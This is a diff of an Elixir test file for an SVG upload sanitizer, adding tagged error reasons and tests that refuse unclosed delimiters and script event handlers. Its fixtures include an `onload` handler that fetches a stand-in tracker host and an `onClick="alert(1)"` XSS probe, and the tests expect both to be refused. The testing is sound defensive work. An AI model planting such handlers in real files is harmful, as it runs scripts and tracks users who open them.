@@ -153,11 +153,11 @@ defmodule Vutuv.Uploads.SvgStripTest do
         ~s(<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x "y">]>) <>
           ~s(<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4"/>)
 
-      assert SvgStrip.clean(markup) == :error
+      assert SvgStrip.clean(markup) == {:error, :unclean}
     end
 
     test "bytes that are not the SVG their name claims" do
-      assert SvgStrip.clean(<<137, "PNG\r\n", 26, 10, 0, 0>>) == :error
+      assert SvgStrip.clean(<<137, "PNG\r\n", 26, 10, 0, 0>>) == {:error, :unclean}
     end
 
     test "an embedded file no container stripper can take apart" do
@@ -167,7 +167,7 @@ defmodule Vutuv.Uploads.SvgStripTest do
         ~s(<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4">) <>
           ~s(<style>@font-face{src:url\(data:font/woff;base64,#{font}\)}</style></svg>)
 
-      assert SvgStrip.clean(markup) == :error
+      assert SvgStrip.clean(markup) == {:error, :svg_embedded_file}
     end
 
     test "an embedded file that is not base64 at all" do
@@ -175,11 +175,80 @@ defmodule Vutuv.Uploads.SvgStripTest do
         ~s(<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink") <>
           ~s( width="4" height="4"><image xlink:href="data:image/svg+xml,%3Csvg%2F%3E"/></svg>)
 
-      assert SvgStrip.clean(markup) == :error
+      assert SvgStrip.clean(markup) == {:error, :svg_unreadable_data}
+    end
+
+    # The other half of the same reason, and the one a member is most likely to
+    # meet: a description that merely *reads* like an embedded file (issue
+    # #2182). The scan cannot tell the two apart — a `data:` run in a text node
+    # is exactly where an editor parks a photograph — so both are refused and
+    # both say so in the same words.
+    test "a description that merely reads like an embedded file" do
+      markup =
+        ~s(<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4">) <>
+          ~s(<desc>Snapshot data:2026, brand book</desc></svg>)
+
+      assert SvgStrip.clean(markup) == {:error, :svg_unreadable_data}
     end
 
     test "markup it cannot parse" do
-      assert SvgStrip.clean(~s(<svg xmlns="http://www.w3.org/2000/svg" width=4></svg>)) == :error
+      assert SvgStrip.clean(~s(<svg xmlns="http://www.w3.org/2000/svg" width=4></svg>)) ==
+               {:error, :unclean}
+    end
+
+    # A delimiter the document never closes is where the refusal has to stay an
+    # answer rather than become a crash: the scan reads `split_on/2` as
+    # `with {before, rest} <- …`, so a two-element failure tuple would match
+    # that pattern and travel on as if it were the rest of the document.
+    # `download.orig` re-cleans a *stored* file on every request, so what a
+    # mis-shaped refusal costs there is a 500 where a 404 belongs.
+    test "a delimiter the document never closes is a refusal, not a crash" do
+      head = ~s(<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4">)
+
+      for {what, markup} <- [
+            {"comment", head <> "<!-- never closed <rect/></svg>"},
+            {"CDATA", head <> "<style><![CDATA[rect{fill:#000}</style></svg>"},
+            {"attribute value", ~s(<svg xmlns="http://www.w3.org/2000/svg" fill="red></svg>)},
+            {"processing instruction", ~s(<?xml version="1.0"<svg/>)},
+            {"dropped subtree", head <> "<metadata><!-- never closed </metadata></svg>"}
+          ] do
+        assert SvgStrip.clean(markup) == {:error, :unclean}, "an unclosed #{what} did not refuse"
+      end
+    end
+  end
+
+  describe "a script handler (issue #2181)" do
+    # The file leaves as an attachment under `nosniff`, so it never runs on our
+    # origin — the person it reaches is the journalist who saves it and opens
+    # it, and for them a standalone `.svg` is a document with a script in it.
+    test "an `on…` attribute is refused rather than removed" do
+      markup =
+        ~s(<svg xmlns="http://www.w3.org/2000/svg" width="8" height="8") <>
+          ~s( onload="fetch\('https://tracker.example/beacon'\)">) <>
+          ~s(<rect width="8" height="8" fill="#000"/></svg>)
+
+      assert SvgStrip.clean(markup) == {:error, :svg_event_handler}
+    end
+
+    test "and so is one deeper in the tree, whatever it spells" do
+      markup =
+        ~s(<svg xmlns="http://www.w3.org/2000/svg" width="8" height="8">) <>
+          ~s(<rect width="8" height="8" fill="#000" onClick="alert\(1\)"/></svg>)
+
+      assert SvgStrip.clean(markup) == {:error, :svg_event_handler}
+    end
+
+    # The precision claim, and the one worth measuring: the refusal reads
+    # attribute names off the parser, not a regex over the whole document, so
+    # the same letters in prose are prose. A scan that refused this would be
+    # #2182's `<desc>` complaint all over again.
+    test "the same letters in a description are not a handler" do
+      markup =
+        ~s(<svg xmlns="http://www.w3.org/2000/svg" width="8" height="8">) <>
+          ~s(<desc>onload = "the moment the page is ready"</desc>) <>
+          ~s(<rect width="8" height="8" fill="#000" opacity="0.5"/></svg>)
+
+      assert {:ok, ^markup} = SvgStrip.clean(markup)
     end
   end
 
@@ -234,7 +303,7 @@ defmodule Vutuv.Uploads.SvgStripTest do
 
       assert {:error, reason} = Spec.open_rotated_binary(markup)
       assert reason =~ "Namespace prefix xlink"
-      assert SvgStrip.clean(markup) == :error
+      assert SvgStrip.clean(markup) == {:error, :unclean}
     end
   end
 
